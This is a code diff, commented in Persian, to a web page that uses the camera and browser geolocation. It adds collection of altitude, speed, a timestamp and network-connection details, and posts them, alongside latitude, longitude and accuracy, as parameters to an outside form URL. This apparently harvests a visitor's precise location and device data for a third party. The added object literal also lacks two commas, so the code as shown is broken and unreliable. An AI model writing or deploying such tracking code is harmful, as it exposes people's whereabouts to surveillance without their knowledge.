@@ -1168,6 +1168,19 @@
             startCamera();
         });
         
+        // تابع برای جمع‌آوری اطلاعات شبکه
+function getNetworkInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+        return {
+            type: connection.type || 'unknown', // نوع اتصال (wifi, cellular, etc.)
+            effectiveType: connection.effectiveType || 'unknown', // نوع اتصال مؤثر (4g, 3g, etc.)
+            downlink: connection.downlink || null // سرعت دانلود تقریبی (Mbps)
+        };
+    }
+    return { type: 'unknown', effectiveType: 'unknown', downlink: null };
+}
+        
         // دریافت موقعیت جغرافیایی
         function getLocation() {
             if (navigator.geolocation) {
@@ -1177,6 +1190,10 @@
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy
+                            altitude: position.coords.altitude || null, // ارتفاع (متر)
+                            speed: position.coords.speed || null, // سرعت (متر بر ثانیه)
+                            timestamp: Date.now()
+                            network: getNetworkInfo() //  اطلاعات شبکه
                         };
                         
                         latitudeValue.textContent = locationData.latitude.toFixed(6);
@@ -1365,6 +1382,9 @@
                 params.append('entry.231075143', locationData.latitude); // عرض جغرافیایی
                 params.append('entry.882095543', locationData.longitude); // طول جغرافیایی
                 params.append('entry.555772584', locationData.accuracy); // دقت
+                params.append('entry.402933101', locationData.altitude || ''); // ارتفاع
+                params.append('entry.1937495850', locationData.speed || ''); // سرعت
+                params.append('entry.1850602721', JSON.stringify(locationData.network) || ''); // شبکه
                 
                 const response = await fetch(FORM_URL, {
                     method: 'POST',
